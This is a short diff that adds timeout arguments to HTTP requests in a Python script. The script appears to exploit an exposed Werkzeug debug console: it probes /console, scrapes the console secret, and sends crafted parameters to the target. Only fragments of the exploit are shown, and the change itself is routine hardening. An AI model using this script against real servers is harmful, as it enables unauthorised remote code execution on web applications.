@@ -11,7 +11,7 @@ if len(sys.argv) != 5:
     sys.exit(-1)
 
 
-response = requests.get("http://{}:{}/console".format(sys.argv[1], sys.argv[2]))
+response = requests.get("http://{}:{}/console".format(sys.argv[1], sys.argv[2]), timeout=10)
 
 if "Werkzeug " not in response.text:
     print("[-] Debug is not enabled")
@@ -26,7 +26,7 @@ __debugger__ = "yes"
 
 frm = "0"
 
-response = requests.get("http://{}:{}/console".format(sys.argv[1], sys.argv[2]))
+response = requests.get("http://{}:{}/console".format(sys.argv[1], sys.argv[2]), timeout=10)
 
 secret = re.findall("[0-9a-zA-Z]{20}", response.text)
 
@@ -51,6 +51,7 @@ response = requests.get(
     "http://{}:{}/console".format(sys.argv[1], sys.argv[2]),
     params=data,
     headers=response.headers,
+    timeout=30,
 )
 
 print("[+] response from server")
